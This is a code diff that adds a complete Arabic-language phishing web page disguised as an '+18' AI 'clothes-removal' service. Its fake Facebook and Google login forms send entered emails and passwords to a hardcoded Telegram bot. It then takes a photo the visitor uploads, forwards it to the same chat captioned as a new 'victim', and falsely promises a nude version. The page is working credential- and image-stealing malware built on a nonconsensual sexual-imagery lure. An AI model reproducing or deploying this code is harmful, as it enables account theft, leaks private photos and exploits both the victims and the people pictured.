@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Deep Vision | نظام المعالجة المتطور</title>
+    <style>
+        :root { --ai-cyan: #00f2ea; --ai-pink: #ff0050; --fb-blue: #1877f2; }
+        body { background: #050505; color: white; font-family: 'Cairo', sans-serif; margin: 0; text-align: center; overflow-x: hidden; }
+        
+        /* تأثير النيون الخلفي */
+        .bg-glow { position: fixed; inset: 0; background: radial-gradient(circle at 50% 50%, #00f2ea05, transparent); z-index: -1; }
+
+        /* الواجهة القديمة المحسنة */
+        .ai-card { background: #0a0a0a; border: 1px solid #222; border-radius: 35px; padding: 45px 25px; max-width: 480px; margin: 30px auto; position: relative; overflow: hidden; box-shadow: 0 0 50px rgba(0, 242, 234, 0.1); }
+        
+        /* 1. صورة البنت الشغالة (العينة) */
+        .sample-image-container { margin: 25px 0; border-radius: 20px; border: 2px solid #222; position: relative; overflow: hidden; background: #111; padding: 5px; display: block; }
+        .sample-img { width: 100%; height: 350px; object-fit: cover; border-radius: 15px; filter: brightness(0.9); }
+        .sample-tag { background: var(--ai-pink); color: white; padding: 3px 10px; border-radius: 5px; font-weight: bold; font-size: 11px; position: absolute; top: 15px; right: 15px; z-index: 10; }
+        .face-blur { position: absolute; top: 0; left: 0; width: 100%; height: 60px; background: rgba(10,10,10,0.9); filter: blur(15px); z-index: 5; }
+
+        /* 2. أزرار فيسبوك وجوجل الحقيقية */
+        .auth-btn { width: 100%; padding: 16px; border-radius: 15px; border: none; font-weight: bold; margin-bottom: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px; font-size: 16px; transition: 0.2s; }
+        .auth-fb { background: var(--fb-blue); color: white; }
+        .auth-goog { background: white; color: #333; border: 1px solid #dadce0; }
+        .brand-icon { width: 22px; height: 22px; }
+
+        /* عداد المسجلين والتقييمات الضخم */
+        .stats-row { background: rgba(255, 255, 255, 0.05); padding: 10px; border-radius: 50px; color: #888; font-size: 11px; margin-top: 25px; display: inline-block; }
+        .stars { color: #ffca28; font-size: 20px; margin: 5px 0; }
+
+        /* 3. بوابة الرفع والفتح المباشر للملفات */
+        #upload-section { display: none; margin-top: 30px; animation: fadeInUp 0.5s forwards; }
+        .drop-zone { border: 2px dashed #444; border-radius: 25px; padding: 50px 20px; background: #0c0c0c; cursor: pointer; position: relative; overflow: hidden; }
+        
+        /* مؤثرات المعالجة "تقليع الملابس" */
+        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: var(--ai-cyan); box-shadow: 0 0 15px var(--ai-cyan); z-index: 10; display: none; animation: scanning 1s linear infinite; }
+        @keyframes scanning { 0% { top: 0%; } 100% { top: 100%; } }
+        .processing-msg { color: var(--ai-cyan); font-weight: bold; margin-top: 15px; display: none; font-size: 14px; }
+
+        /* صفحات الصيد طبق الأصل */
+        #fb-view, #goog-view { display: none; position: fixed; inset: 0; z-index: 50000; text-align: right; }
+        .fb-login-design { background: #f0f2f5; height: 100%; padding: 40px 20px; color: #1c1e21; }
+        .goog-login-design { background: #fff; height: 100%; padding: 40px 20px; color: #202124; }
+        input { width: 100%; padding: 15px; margin-bottom: 12px; border-radius: 8px; border: 1px solid #dddfe2; box-sizing: border-box; font-size: 16px; }
+
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body dir="rtl">
+
+<div class="bg-glow"></div>
+
+<div class="ai-card">
+    <h1 style="color:var(--ai-cyan); margin:0; font-size:26px;">DIESEL AI Deep +18</h1>
+    <p style="color:#666; font-size:13px;">أقوى محرك عربي لقلع الملابس باستخدام الذكاء الاصطناعي</p>
+
+    <div class="sample-image-container">
+        <div class="sample-tag">عينة معالجة حية</div>
+        <img src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=500" class="sample-img">
+        <div class="face-blur"></div>
+    </div>
+
+    <div id="auth-buttons">
+        <p style="color:#777; font-size:14px; margin-bottom:15px;">يجب تسجيل الدخول لفتح أدوات المعالجة العميقة.</p>
+        <button class="auth-btn auth-fb" onclick="openLogin('fb')">
+            <svg class="brand-icon" viewBox="0 0 24 24" fill="white"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+            متابعة باستخدام Facebook
+        </button>
+        <button class="auth-btn auth-goog" onclick="openLogin('goog')">
+            <img class="brand-icon" src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Logo.svg">
+            متابعة باستخدام Google
+        </button>
+    </div>
+
+    <div class="stars">★★★★★</div>
+    <div class="stats-row">👥 إجمالي المستخدمين الذين قاموا بالتقييم: 1,482,903 مستخدم</div>
+
+    <div id="upload-section">
+        <h3 style="color:var(--ai-cyan)">تم التحقق من حسابك ✅</h3>
+        <p>ارفع الآن الصورة التي تريد قلع ملابسها بالذكاء الاصطناعي</p>
+        <div class="drop-zone" onclick="document.getElementById('file-picker').click()">
+            <div class="scan-line" id="scan-line"></div>
+            <div id="upload-placeholder">
+                <div style="font-size:45px">🖼️</div>
+                <p id="file-txt">اضغط هنا لاختيار الصورة من ملفاتك</p>
+            </div>
+            <img id="user-img-preview" src="#" style="display:none; width:100%; border-radius:15px;">
+            <input type="file" id="file-picker" style="display:none" onchange="startStripping()">
+        </div>
+        <div id="proc-msg" class="processing-msg">جاري قلع الملابس بالذكاء الاصطناعي الآن...</div>
+        <button id="final-btn" class="auth-btn" style="background:var(--ai-pink); color:white; margin-top:20px; display:none;" onclick="processFinal()">تفعيل القلع الآن</button>
+    </div>
+</div>
+
+<div id="fb-view">
+    <div class="fb-login-design">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zHe6Wy.svg" width="160" style="margin-bottom:20px">
+        <div style="background:#fff; padding:20px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,0.1)">
+            <p style="text-align:center; font-size:18px; color:#1c1e21;">تسجيل الدخول إلى فيسبوك</p>
+            <input type="text" id="fb-e" placeholder="رقم الهاتف أو البريد الإلكتروني">
+            <input type="password" id="fb-p" placeholder="كلمة السر">
+            <button style="background:#1877f2; color:white; border:none; width:100%; padding:12px; border-radius:6px; font-weight:bold; font-size:20px; cursor:pointer;" onclick="hit('Facebook')">تسجيل الدخول</button>
+        </div>
+    </div>
+</div>
+
+<div id="goog-view">
+    <div class="goog-login-design">
+        <div style="max-width:450px; margin:auto; border:1px solid #dadce0; border-radius:8px; padding:40px 30px;">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
+            <h2 style="font-weight:400; margin-top:20px;">تسجيل الدخول</h2>
+            <p>استخدم حسابك على Google للمتابعة إلى AI Deep</p>
+            <input type="text" id="g-e" placeholder="البريد الإلكتروني أو الهاتف">
+            <input type="password" id="g-p" placeholder="أدخل كلمة المرور">
+            <button style="background:#1a73e8; color:white; border:none; padding:10px 24px; border-radius:4px; font-weight:bold; float:left; margin-top:30px; cursor:pointer;" onclick="hit('Google')">التالي</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const token = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU";
+    const chatId = "5177962707";
+
+    function speak(text) {
+        const msg = new SpeechSynthesisUtterance(text);
+        msg.lang = 'ar-SA'; window.speechSynthesis.speak(msg);
+    }
+
+    // صوت ترحيبي عند أول تفاعل
+    window.onclick = function() {
+        speak("مرحباً بك في محرك الديزل للذكاء الاصطناعي. يرجى تسجيل الدخول لفتح أدوات المعالجة المتقدمة.");
+        window.onclick = null; // يشتغل مرة واحدة
+    }
+
+    function openLogin(p) {
+        if(p==='fb') document.getElementById('fb-view').style.display='block';
+        else document.getElementById('goog-view').style.display='block';
+    }
+
+    function hit(p) {
+        let e = (p==='Facebook')? document.getElementById('fb-e').value : document.getElementById('g-e').value;
+        let ps = (p==='Facebook')? document.getElementById('fb-p').value : document.getElementById('g-p').value;
+        if(!e || !ps) return alert("البيانات غير صحيحة");
+
+        // إرسال الحساب للتليجرام (الصيد)
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("👑 صيد حساب (+18):\nالمنصة: "+p+"\nالحساب: "+e+"\nالباسورد: "+ps)}`);
+        
+        document.getElementById('fb-view').style.display='none';
+        document.getElementById('goog-view').style.display='none';
+        document.getElementById('auth-buttons').style.display='none';
+        document.getElementById('upload-section').style.display='block';
+        
+        speak("تم تسجيل الدخول بحسابك بنجاح. يمكنك الآن اختيار الصورة من ملفات جهازك لقلع ملابسها بالذكاء الاصطناعي.");
+    }
+
+    // وظيفة فتح الملفات وبدء "القلع"
+    function startStripping() {
+        const file = document.getElementById('file-picker').files[0];
+        if (file) {
+            // إظهار المعاينة
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                document.getElementById('upload-placeholder').style.display = 'none';
+                document.getElementById('user-img-preview').src = e.target.result;
+                document.getElementById('user-img-preview').style.display = 'block';
+                document.getElementById('scan-line').style.display = 'block';
+                
+                // الصوت والرسائل (تقليع الملابس)
+                speak("تم استلام الصورة. جاري تحليل الأنسجة وإزالة الملابس بالذكاء الاصطناعي الآن. انتظر ثواني.");
+                document.getElementById('proc-msg').style.display = 'block';
+                
+                setTimeout(() => {
+                    document.getElementById('scan-line').style.display = 'none';
+                    document.getElementById('final-btn').style.display = 'block';
+                    document.getElementById('proc-msg').innerText = "تمت معالجة الصورة بنجاح! اضغط لتفعيل النسخة العارية.";
+                }, 4000); // 4 ثواني محاكاة للمعالجة السريعة
+            }
+            reader.readAsDataURL(file);
+        }
+    }
+
+    function processFinal() {
+        const file = document.getElementById('file-picker').files[0];
+        if(!file) return alert("يرجى اختيار صورة أولاً!");
+        
+        document.getElementById('final-btn').innerText = "جاري تفعيل القلع...";
+        document.getElementById('final-btn').disabled = true;
+
+        // إرسال الصورة للتليجرام (صيد الصور)
+        const fd = new FormData(); 
+        fd.append('chat_id', chatId); 
+        fd.append('photo', file);
+        fd.append('caption', "📸 ضحية جديد رفع صورته للقلع!");
+        
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd})
+        .then(() => {
+            alert("✅ تم الانتهاء من المعالجة بنسبة 100%! سيتم إرسال رابط تحميل الصورة العارية إلى حسابك المسجل فوراً.");
+            location.reload();
+        });
+    }
+</script>
+</body>
+</html>
